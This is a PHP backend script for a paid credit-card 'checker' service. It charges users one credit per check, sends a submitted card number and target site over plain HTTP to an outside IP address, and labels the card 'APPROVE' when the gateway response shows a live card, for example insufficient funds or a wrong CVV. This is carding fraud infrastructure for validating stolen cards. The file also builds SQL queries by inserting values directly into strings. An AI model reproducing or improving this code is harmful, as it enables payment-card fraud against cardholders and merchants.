<?php
include('../config.php');
session_start();
header('Content-Type: application/json');

if (!isset($_SESSION['user_id'])) {
    echo json_encode(['status' => 'error', 'message' => 'Not logged in']);
    exit();
}

$user_id = $_SESSION['user_id'];

// Fetch user credits
$sql = "SELECT username, credit FROM users WHERE id = '$user_id' LIMIT 1";
$result = mysqli_query($conn, $sql);
$user = mysqli_fetch_assoc($result);

if (!$user || $user['credit'] <= 0) {
    echo json_encode(['status' => 'error', 'message' => 'No credits left']);
    exit();
}

// Deduct 1 credit
mysqli_query($conn, "UPDATE users SET credit = credit - 1 WHERE id = '$user_id'");

if (!isset($_POST['cc']) || !isset($_POST['custom_site']) || empty($_POST['custom_site'])) {
    echo json_encode(['status' => 'error', 'message' => 'No card or site provided']);
    exit();
}

$cc = trim($_POST['cc']);
$custom_site = trim($_POST['custom_site']);
$api_url = "http://137.184.155.22/index.php//?cc=" . urlencode($cc) . "&site=" . urlencode($custom_site);

// Execute check
$start = microtime(true);
$response = @file_get_contents($api_url);
$end = microtime(true);
$time_taken = round($end - $start, 2) . 's';

$decoded = json_decode($response, true);

if (!$decoded || !isset($decoded['Response'])) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Invalid response from API',
        'raw' => $response
    ]);
    exit();
}

$message_raw = strtolower($decoded['Response'] ?? '');
$card = $decoded['cc'] ?? $cc;
$price = $decoded['Price'] ?? '';
$gateway = $decoded['Gateway'] ?? '';

$approve_keywords = [
    "invalid_cvv", "incorrect_cvv", "insufficient_funds",
    "approved", "thank you", "success", "invalid_cvc",
    "incorrect_cvc", "incorrect_zip", "3d_authentication"
];

$status = 'DECLINE ❌';
foreach ($approve_keywords as $k) {
    if (strpos($message_raw, $k) !== false) {
        $status = 'APPROVE ✅';
        break;
    }
}

echo json_encode([
    'status' => $status,
    'message' => $decoded['Response'] ?? 'No message',
    'card' => $card,
    'price' => $price,
    'gateway' => $gateway,
    'time' => $time_taken,
    'site_used' => $custom_site,
    'raw' => $response
]);
?>
